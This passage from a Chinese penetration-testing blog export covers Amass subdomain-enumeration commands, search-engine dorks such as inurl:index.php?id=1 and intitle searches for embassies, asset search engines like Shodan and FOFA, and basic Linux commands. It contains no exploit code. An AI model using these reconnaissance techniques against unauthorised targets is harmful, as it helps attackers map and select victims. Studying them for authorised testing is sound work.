查看所有支持的数据源</span><br>python3 theHarvester.py -h<br></code></pre></td></tr></table></figure><hr><h2 id="4️⃣-Amass"><a href="#4️⃣-Amass" class="headerlink" title="4️⃣ Amass"></a>4️⃣ Amass</h2><ul><li><p><strong>项目地址</strong>：<a href="https://github.com/OWASP/Amass">🔗 https://github.com/OWASP/Amass</a></p></li><li><p><strong>功能</strong>：最强大的子域名枚举框架之一，支持主动&#x2F;被动混合模式，数据可视化</p></li><li><p><strong>语言</strong>：Go</p></li><li><p><strong>特点</strong>：</p><ul><li>支持主动扫描 + 被动收集 + 混合模式</li><li>支持 ASN 分析、DNS 爆破、端口识别等</li><li>输出格式支持 TXT&#x2F;JSON&#x2F;GDF 等</li><li>可视化结果可联动 Neo4j、Maltego</li></ul></li></ul><h3 id="✅-安装方式（Kali-可直接安装）"><a href="#✅-安装方式（Kali-可直接安装）" class="headerlink" title="✅ 安装方式（Kali 可直接安装）"></a>✅ 安装方式（Kali 可直接安装）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install amass<br><span class="hljs-comment"># 或者使用 go 安装</span><br>go install -v github.com/owasp-amass/amass/v4/...@latest<br></code></pre></td></tr></table></figure><h3 id="🛠-常见用法-2"><a href="#🛠-常见用法-2" class="headerlink" title="🛠 常见用法"></a>🛠 常见用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 被动模式枚举</span><br>amass enum -passive -d example.com<br><br><span class="hljs-comment"># 主动扫描模式（需 DNS 解析权限）</span><br>amass enum -active -d example.com<br><br><span class="hljs-comment"># 暴力破解 + 源信息标注</span><br>amass enum -brute -d example.com -src<br><br><span class="hljs-comment"># 输出结构化结果（JSON）</span><br>amass enum -d example.com -oA amass_output<br><br><span class="hljs-comment"># 可视化分析图谱</span><br>amass viz -d3 -<span class="hljs-built_in">dir</span> amass_output<br></code></pre></td></tr></table></figure><hr><h2 id="📦-工具对比总结表"><a href="#📦-工具对比总结表" class="headerlink" title="📦 工具对比总结表"></a>📦 工具对比总结表</h2><table><thead><tr><th>工具</th><th>模式</th><th>特点</th><th>是否支持暴力</th><th>是否需配置 API</th><th>输出格式</th></tr></thead><tbody><tr><td>Subfinder</td><td>被动</td><td>快速、支持 API、多源整合</td><td>否</td><td>是（可选）</td><td>TXT &#x2F; JSON</td></tr><tr><td>Knock</td><td>字典暴力</td><td>简单、定制强、易扩展</td><td>✅ 是</td><td>否</td><td>TXT</td></tr><tr><td>TheHarvester</td><td>被动</td><td>多维情报收集，社工必备</td><td>否</td><td>否</td><td>TXT &#x2F; HTML</td></tr><tr><td>Amass</td><td>主动 &#x2F; 被动 &#x2F; 混合</td><td>架构完整、可视化输出、功能最强大</td><td>✅ 是</td><td>✅ 建议配置</td><td>TXT &#x2F; JSON &#x2F; GDF</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>信息收集</tag>
      
      <tag>子域名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通用搜索引擎技巧</title>
    <link href="/2025/07/20/%E9%80%9A%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/07/20/%E9%80%9A%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="🔍-通用搜索引擎技巧（百度-Google-Bing）"><a href="#🔍-通用搜索引擎技巧（百度-Google-Bing）" class="headerlink" title="🔍 通用搜索引擎技巧（百度 &#x2F; Google &#x2F; Bing）"></a>🔍 通用搜索引擎技巧（百度 &#x2F; Google &#x2F; Bing）</h2><ol><li><p>🌐 <strong>按网站域名搜索（site）</strong><br>用于限定搜索结果来自某一特定网站&#x2F;域名。<br>示例：<br><code>site:cc.com</code></p></li><li><p>🔗 <strong>按页面链接结构搜索（inurl）</strong><br>用于搜索 URL 中包含特定关键词的页面，常用于探测网站脚本语言：<br>示例关键词：</p><ul><li>PHP 网站：<code>inurl:index.php?id=1</code></li><li>ASP 网站：<code>inurl:index.asp?id=1</code></li><li>ASPX 网站：<code>inurl:index.aspx?id=1</code></li><li>JSP 网站：<code>inurl:index.jsp?id=1</code></li></ul></li><li><p>📛 <strong>按页面标题搜索（intitle）</strong><br>用于搜索网页标题中包含特定关键词的页面。<br>示例关键词：</p><ul><li>协会：<code>intitle:协会</code></li><li>bae：<code>intitle:bae</code></li><li>大使馆：<code>intitle:大使馆</code></li><li>五眼联盟：<code>intitle:五眼联盟</code></li></ul></li><li><p>🎯 <strong>精确匹配关键词（双引号）</strong><br>用于精确匹配短语或全名，不允许中间插词。<br>示例：<br><code>&quot;教育&quot;</code></p></li><li><p>🔗 <strong>组合搜索（多个语法结合）</strong><br>可以将多个语法结合使用，提高搜索精准度。<br>示例：<br><code>intitle:bae site:bae.com</code></p></li><li><p>📑 <strong>高级搜索界面（百度）</strong><br>使用百度提供的高级搜索界面进行图形化配置：<br><a href="http://www.baidu.com/gaoji/advanced.html">百度高级搜索</a></p></li></ol><hr><h2 id="🔎-Google-搜索（语法与百度类似）"><a href="#🔎-Google-搜索（语法与百度类似）" class="headerlink" title="🔎 Google 搜索（语法与百度类似）"></a>🔎 Google 搜索（语法与百度类似）</h2><table><thead><tr><th>功能</th><th>搜索语法</th></tr></thead><tbody><tr><td>指定站点</td><td><code>site:&quot;cc.com&quot;</code></td></tr><tr><td>PHP</td><td><code>inurl:&quot;index.php?id=1&quot;</code></td></tr><tr><td>ASP</td><td><code>inurl:&quot;index.asp?id=1&quot;</code></td></tr><tr><td>ASPX</td><td><code>inurl:&quot;index.aspx?id=1&quot;</code></td></tr><tr><td>JSP</td><td><code>inurl:&quot;index.jsp?id=1&quot;</code></td></tr><tr><td>标题包含</td><td><code>intitle:大使馆</code></td></tr><tr><td>精确搜索</td><td><code>&quot;教育&quot;</code></td></tr><tr><td>组合搜索</td><td><code>intitle:bae site:bae.com</code></td></tr></tbody></table><hr><h2 id="🛰️-网络空间搜索引擎（资产搜索）"><a href="#🛰️-网络空间搜索引擎（资产搜索）" class="headerlink" title="🛰️ 网络空间搜索引擎（资产搜索）"></a>🛰️ 网络空间搜索引擎（资产搜索）</h2><table><thead><tr><th>平台</th><th>网址</th><th>功能说明</th></tr></thead><tbody><tr><td>ZoomEye</td><td><a href="https://www.zoomeye.org/">ZoomEye - Cyberspace Search Engine</a></td><td>中国开发的网络空间搜索引擎，可搜索主机、服务、组件</td></tr><tr><td>FOFA</td><td><a href="https://fofa.info/">FOFA</a></td><td>面向安全研究人员的资产搜索引擎，支持语法化查询</td></tr><tr><td>Shodan</td><td><a href="https://www.shodan.io/">Shodan</a></td><td>国外最知名的网络空间搜索引擎，可查开放端口、设备系统信息等</td></tr></tbody></table><hr><h2 id="✅-总结对比表"><a href="#✅-总结对比表" class="headerlink" title="✅ 总结对比表"></a>✅ 总结对比表</h2><table><thead><tr><th>搜索方式</th><th>典型语法</th><th>主要用途</th></tr></thead><tbody><tr><td><code>site:</code></td><td><code>site:cc.com</code></td><td>限定搜索域名</td></tr><tr><td><code>inurl:</code></td><td><code>inurl:index.php?id=1</code></td><td>搜索网站结构&#x2F;脚本语言</td></tr><tr><td><code>intitle:</code></td><td><code>intitle:bae</code></td><td>页面标题匹配</td></tr><tr><td><code>&quot;&quot;</code>（双引号）</td><td><code>&quot;教育&quot;</code></td><td>精确短语搜索</td></tr><tr><td>多语法组合</td><td><code>intitle:协会 site:gov.cn</code></td><td>精准定位内容</td></tr><tr><td>ZoomEye &#x2F; FOFA &#x2F; Shodan</td><td>Web 界面 &#x2F; API</td><td>网络空间资产搜索，安全情报分析</td></tr></tbody></table><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
      <category>搜索技巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>命令</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux基础</title>
    <link href="/2025/07/20/linux%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/07/20/linux%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-操作基础文档"><a href="#Linux-操作基础文档" class="headerlink" title="Linux 操作基础文档"></a>Linux 操作基础文档</h1><h2 id="一、远程登录与关机-重启操作"><a href="#一、远程登录与关机-重启操作" class="headerlink" title="一、远程登录与关机&#x2F;重启操作"></a>一、远程登录与关机&#x2F;重启操作</h2><h3 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@192.168.202.136<br></code></pre></td></tr></table></figure><h3 id="断开连接"><a href="#断开连接" class="headerlink" title="断开连接"></a>断开连接</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h3 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">reboot<br><span class="hljs-meta"># 或者</span><br><span class="hljs-built_in">shutdown</span> -r now<br></code></pre></td></tr></table></figure><h3 id="默认30秒后关机"><a href="#默认30秒后关机" class="headerlink" title="默认30秒后关机"></a>默认30秒后关机</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">shutdown<br></code></pre></td></tr></table></figure><h3 id="立即关机"><a href="#立即关机" class="headerlink" title="立即关机"></a>立即关机</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">shutdown -h <span class="hljs-built_in">now</span><br></code></pre></td></tr></table></figure><h3 id="10分钟后关机"><a href="#10分钟后关机" class="headerlink" title="10分钟后关机"></a>10分钟后关机</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shutdown</span> -h <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h2 id="二、文件和目录操作"><a href="#二、文件和目录操作" class="headerlink" title="二、文件和目录操作"></a>二、文件和目录操作</h2><h3 id="1-创建文件"><a href="#1-创建文件" class="headerlink" title="1. 创建文件"></a>1. 创建文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 1.txt                <span class="hljs-comment"># 创建单个文件</span><br><span class="hljs-built_in">touch</span> <span class="hljs-built_in">test</span>&#123;1..10&#125;.txt      <span class="hljs-comment"># 批量创建文件 test1.txt 到 test10.txt</span><br><span class="hljs-built_in">touch</span> <span class="hljs-built_in">test</span>&#123;a..f&#125;.txt       <span class="hljs-comment"># 批量创建 testa.txt 到 testf.txt</span><br><span class="hljs-built_in">touch</span> /root/4.txt          <span class="hljs-comment"># 指定路径创建文件</span><br></code></pre></td></tr></table></figure><p>⚠️ <code>touch</code> 不会覆盖已有同名文件。</p><h3 id="2-查看目录文件"><a href="#2-查看目录文件" class="headerlink" title="2. 查看目录文件"></a>2. 查看目录文件</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span>                        <span class="hljs-comment"># 查看当前目录内容</span><br><span class="hljs-keyword">ls</span> test09.txt             <span class="hljs-comment"># 查看指定文件是否存在</span><br><span class="hljs-keyword">ls</span> *<span class="hljs-string">.txt</span>                  <span class="hljs-comment"># 查看所有 txt 文件</span><br><span class="hljs-keyword">ls</span> -1                     <span class="hljs-comment"># 每行显示一个文件（注意是数字1）</span><br><span class="hljs-keyword">ls</span> -a                     <span class="hljs-comment"># 显示所有文件，包括隐藏文件</span><br><span class="hljs-keyword">ls</span> -a -1                  <span class="hljs-comment"># 所有文件 + 每行一个</span><br><span class="hljs-keyword">ls</span> -l                     <span class="hljs-comment"># 详细信息列表</span><br></code></pre></td></tr></table></figure><h3 id="3-移动与重命名文件"><a href="#3-移动与重命名文件" class="headerlink" title="3. 移动与重命名文件"></a>3. 移动与重命名文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> 222.txt 123.txt        <span class="hljs-comment"># 重命名</span><br><span class="hljs-built_in">mv</span> 123.txt /opt           <span class="hljs-comment"># 移动文件到指定目录</span><br><span class="hljs-built_in">mv</span> aaa wulaoban           <span class="hljs-comment"># 重命名文件夹</span><br></code></pre></td></tr></table></figure><h3 id="4-复制文件-目录"><a href="#4-复制文件-目录" class="headerlink" title="4. 复制文件&#x2F;目录"></a>4. 复制文件&#x2F;目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> test01.txt /opt/       <span class="hljs-comment"># 复制文件</span><br><span class="hljs-built_in">cp</span> -a dev04 /opt/         <span class="hljs-comment"># 复制整个目录（需在其上一级目录执行）</span><br></code></pre></td></tr></table></figure><h3 id="5-删除文件-目录（危险操作❗）"><a href="#5-删除文件-目录（危险操作❗）" class="headerlink" title="5. 删除文件&#x2F;目录（危险操作❗）"></a>5. 删除文件&#x2F;目录（危险操作❗）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> /opt/123.txt           <span class="hljs-comment"># 删除文件（需确认）</span><br><span class="hljs-built_in">rm</span> -f /opt/test01.txt     <span class="hljs-comment"># 强制删除</span><br><span class="hljs-built_in">rm</span> file1 file2 file3      <span class="hljs-comment"># 删除多个文件</span><br><span class="hljs-built_in">rm</span> -rf dev                <span class="hljs-comment"># 强制递归删除目录</span><br></code></pre></td></tr></table></figure><h3 id="6-创建目录"><a href="#6-创建目录" class="headerlink" title="6. 创建目录"></a>6. 创建目录</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> dev                 # 创建单个目录<br><span class="hljs-attribute">mkdir</span> dev&#123;<span class="hljs-number">01</span>..<span class="hljs-number">10</span>&#125;         # 批量创建目录<br><span class="hljs-attribute">mkdir</span> -p <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">3</span>/<span class="hljs-number">4</span>/<span class="hljs-number">5</span>/<span class="hljs-number">6</span>      # 创建多级子目录<br></code></pre></td></tr></table></figure><h3 id="7-切换目录"><a href="#7-切换目录" class="headerlink" title="7. 切换目录"></a>7. 切换目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">local</span>                  <span class="hljs-comment"># 进入 local 目录</span><br><span class="hljs-built_in">cd</span> /usr/local             <span class="hljs-comment"># 进入指定路径</span><br><span class="hljs-built_in">cd</span> ..                     <span class="hljs-comment"># 返回上一级目录</span><br><span class="hljs-built_in">cd</span> ../..                  <span class="hljs-comment"># 返回上两级目录</span><br><span class="hljs-built_in">cd</span> /                      <span class="hljs-comment"># 进入根目录</span><br></code></pre></td></tr></table></figure><h3 id="8-打印当前目录"><a href="#8-打印当前目录" class="headerlink" title="8. 打印当前目录"></a>8. 打印当前目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>                       <span class="hljs-comment"># 显示当前路径</span><br></code></pre></td></tr></table></figure><h3 id="9-历史命令查询"><a href="#9-历史命令查询" class="headerlink" title="9. 历史命令查询"></a>9. 历史命令查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h2 id="三、文本操作与查看"><a href="#三、文本操作与查看" class="headerlink" title="三、文本操作与查看"></a>三、文本操作与查看</h2><h3 id="10-vi-编辑器（三种模式）"><a href="#10-vi-编辑器（三种模式）" class="headerlink" title="10. vi 编辑器（三种模式）"></a>10. vi 编辑器（三种模式）</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vi</span> test03.txt             <span class="hljs-comment"># 打开文件编辑</span><br></code></pre></td></tr></table></figure><ul><li>编辑模式: 输入 <code>a/i/o</code> 进入编辑</li><li>常规模式: 按 <code>esc</code> 回到默认</li><li>命令模式: 输入 <code>:</code> 开始命令</li></ul><p>常用命令:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:wq</span>   <span class="hljs-comment"># 保存退出</span><br><span class="hljs-symbol">:q</span>    <span class="hljs-comment"># 退出</span><br><span class="hljs-symbol">:q!</span>   <span class="hljs-comment"># 强制退出不保存</span><br>dd    <span class="hljs-comment"># 删除整行</span><br></code></pre></td></tr></table></figure><h3 id="11-查看文件内容"><a href="#11-查看文件内容" class="headerlink" title="11. 查看文件内容"></a>11. 查看文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test03.txt            <span class="hljs-comment"># 从头到尾查看</span><br><span class="hljs-built_in">tac</span> test03.txt            <span class="hljs-comment"># 倒序查看</span><br><span class="hljs-built_in">head</span> test03.txt           <span class="hljs-comment"># 查看前10行</span><br><span class="hljs-built_in">head</span> -5 test03.txt        <span class="hljs-comment"># 查看前5行</span><br><span class="hljs-built_in">tail</span> test03.txt           <span class="hljs-comment"># 查看后10行</span><br><span class="hljs-built_in">tail</span> -n 5 test03.txt      <span class="hljs-comment"># 查看后5行</span><br></code></pre></td></tr></table></figure><h2 id="四、管道与过滤操作"><a href="#四、管道与过滤操作" class="headerlink" title="四、管道与过滤操作"></a>四、管道与过滤操作</h2><h3 id="12-管道符（-）"><a href="#12-管道符（-）" class="headerlink" title="12. 管道符（|）"></a>12. 管道符（|）</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span> addr | tail -<span class="hljs-number">4</span>                         # 查看命令输出最后<span class="hljs-number">4</span>行<br><span class="hljs-attribute">ip</span> addr | tail -<span class="hljs-number">4</span> | head -<span class="hljs-number">1</span>              # 截取中间某一行<br><span class="hljs-attribute">ip</span> addr | tail -<span class="hljs-number">4</span> | head -<span class="hljs-number">1</span> | cut -c <span class="hljs-number">10</span>-<span class="hljs-number">19</span>  # 取出字符的第<span class="hljs-number">10</span>~<span class="hljs-number">19</span>列（不常用）<br></code></pre></td></tr></table></figure><h3 id="13-统计命令-wc"><a href="#13-统计命令-wc" class="headerlink" title="13. 统计命令 wc"></a>13. 统计命令 wc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> aaa.txt | <span class="hljs-built_in">wc</span> -l     <span class="hljs-comment"># 统计行数</span><br><span class="hljs-built_in">cat</span> -n aaa.txt          <span class="hljs-comment"># 显示内容 + 行号</span><br><span class="hljs-built_in">wc</span> -c aaa.txt           <span class="hljs-comment"># 统计字符数</span><br>ip addr | <span class="hljs-built_in">wc</span> -l         <span class="hljs-comment"># 统计行数</span><br></code></pre></td></tr></table></figure><h3 id="14-生成数字序列-seq"><a href="#14-生成数字序列-seq" class="headerlink" title="14. 生成数字序列 seq"></a>14. 生成数字序列 seq</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">seq</span> <span class="hljs-number">5</span> <span class="hljs-number">12</span>                  # 输出 <span class="hljs-number">5</span> 到 <span class="hljs-number">12</span><br><span class="hljs-attribute">seq</span> -w <span class="hljs-number">5</span> <span class="hljs-number">12</span>               # 等宽格式输出<br></code></pre></td></tr></table></figure><h3 id="15-行过滤-grep"><a href="#15-行过滤-grep" class="headerlink" title="15. 行过滤 grep"></a>15. 行过滤 grep</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;333&#x27;</span> aaa.txt             <span class="hljs-comment"># 模糊匹配行中含有 333</span><br><span class="hljs-keyword">grep</span> -n <span class="hljs-string">&#x27;333&#x27;</span> aaa.txt          <span class="hljs-comment"># 显示行号</span><br>ip addr | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;inet&#x27;</span>          <span class="hljs-comment"># 过滤出包含 inet 的行</span><br><span class="hljs-keyword">grep</span> -w <span class="hljs-string">&#x27;关键字&#x27;</span> 文件             <span class="hljs-comment"># 精准匹配整词</span><br></code></pre></td></tr></table></figure><h3 id="16-按列取值-awk"><a href="#16-按列取值-awk" class="headerlink" title="16. 按列取值 awk"></a>16. 按列取值 awk</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> aaa.txt         <span class="hljs-comment"># 输出第一列</span><br>awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$2</span>&#125;&#x27;</span> aaa.txt         <span class="hljs-comment"># 输出第二列</span><br>awk -F <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> aaa.txt  <span class="hljs-comment"># 以逗号为分隔符取第一列</span><br>awk -F <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$NF</span>&#125;&#x27;</span> aaa.txt <span class="hljs-comment"># 取最后一列</span><br></code></pre></td></tr></table></figure><h3 id="17-排序-sort"><a href="#17-排序-sort" class="headerlink" title="17. 排序 sort"></a>17. 排序 sort</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test02.txt | <span class="hljs-built_in">sort</span> -n        <span class="hljs-comment"># 按数字升序排序</span><br><span class="hljs-built_in">cat</span> test02.txt | <span class="hljs-built_in">sort</span> -n -r     <span class="hljs-comment"># 数字降序排序</span><br></code></pre></td></tr></table></figure><h3 id="18-去重-uniq"><a href="#18-去重-uniq" class="headerlink" title="18. 去重 uniq"></a>18. 去重 uniq</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test02.txt | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span>         <span class="hljs-comment"># 去重</span><br><span class="hljs-built_in">cat</span> test02.txt | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">uniq</span> -c      <span class="hljs-comment"># 去重并统计每项出现次数</span><br></code></pre></td></tr></table></figure><h2 id="五、Linux-目录结构基础与路径理解"><a href="#五、Linux-目录结构基础与路径理解" class="headerlink" title="五、Linux 目录结构基础与路径理解"></a>五、Linux 目录结构基础与路径理解</h2><h3 id="📌-Linux-的一切皆文件。以下是常见目录说明，重要目录切勿随意删除！"><a href="#📌-Linux-的一切皆文件。以下是常见目录说明，重要目录切勿随意删除！" class="headerlink" title="📌 Linux 的一切皆文件。以下是常见目录说明，重要目录切勿随意删除！"></a>📌 Linux 的一切皆文件。以下是常见目录说明，重要目录切勿随意删除！</h3><table><thead><tr><th>目录</th><th>功能说明</th><th>是否可删除</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>存放基本二进制命令（如 ls, cp, mv 等）</td><td>❌不能删除</td></tr><tr><td>&#x2F;sbin</td><td>系统管理员使用的命令（如 reboot, shutdown 等）</td><td>❌不能删除</td></tr><tr><td>&#x2F;boot</td><td>启动引导相关文件（如内核）</td><td>❌不能删除</td></tr><tr><td>&#x2F;dev</td><td>设备文件目录，如硬盘、U盘、终端等</td><td>❌不能删除</td></tr><tr><td>&#x2F;etc</td><td>系统配置文件目录，相当于 Windows 的注册表</td><td>❌不能删除</td></tr><tr><td>&#x2F;home</td><td>所有普通用户的家目录所在位置</td><td>✅可管理（慎删）</td></tr><tr><td>&#x2F;root</td><td>root 管理员用户的专属家目录</td><td>❌不能删除</td></tr><tr><td>&#x2F;lib</td><td>32 位系统库文件（.so动态链接库）</td><td>❌不能删除</td></tr><tr><td>&#x2F;lib64</td><td>64 位系统库文件</td><td>❌不能删除</td></tr><tr><td>&#x2F;media</td><td>系统挂载可移动介质（U盘、光盘）时的默认目录</td><td>⚠️可删除（root 权限）</td></tr><tr><td>&#x2F;mnt</td><td>手动挂载目录（如 NFS&#x2F;U盘）</td><td>⚠️可删除</td></tr><tr><td>&#x2F;opt</td><td>第三方软件默认安装路径之一</td><td>⚠️可删除</td></tr><tr><td>&#x2F;proc</td><td>虚拟进程目录，每个运行中的进程一个目录</td><td>❌不能删除</td></tr><tr><td>&#x2F;srv</td><td>通常用于放置服务相关的源代码或数据</td><td>⚠️可删除</td></tr><tr><td>&#x2F;sys</td><td>提供内核与硬件交互的接口</td><td>❌不能删除</td></tr><tr><td>&#x2F;tmp</td><td>临时文件目录，系统重启或定期自动清除</td><td>⚠️可清空</td></tr><tr><td>&#x2F;run</td><td>存放运行时状态文件，如 PID 文件、锁文件等</td><td>❌不能删除</td></tr><tr><td>&#x2F;usr</td><td>用户级程序、库、资源文件目录（如 &#x2F;usr&#x2F;bin）</td><td>❌不能删除</td></tr><tr><td>&#x2F;var</td><td>经常变动的数据目录，如日志 &#x2F;var&#x2F;log、缓存等</td><td>❌不能删除</td></tr></tbody></table><hr><h2 id="六、用户和用户组管理"><a href="#六、用户和用户组管理" class="headerlink" title="六、用户和用户组管理"></a>六、用户和用户组管理</h2><h3 id="👤-1-用户管理"><a href="#👤-1-用户管理" class="headerlink" title="👤 1. 用户管理"></a>👤 1. 用户管理</h3><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">useradd</span> test1          <span class="hljs-comment"># 创建 test1 用户</span><br>passwd test1           <span class="hljs-comment"># 为 test1 设置密码（root 操作）</span><br></code></pre></td></tr></table></figure><h4 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span> test1<br></code></pre></td></tr></table></figure><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">userdel</span> test1              <span class="hljs-comment"># 删除用户（需先退出登录）</span><br>userdel -r test1           <span class="hljs-comment"># 删除用户并清理家目录等相关内容</span><br></code></pre></td></tr></table></figure><h4 id="修改用户属性"><a href="#修改用户属性" class="headerlink" title="修改用户属性"></a>修改用户属性</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span 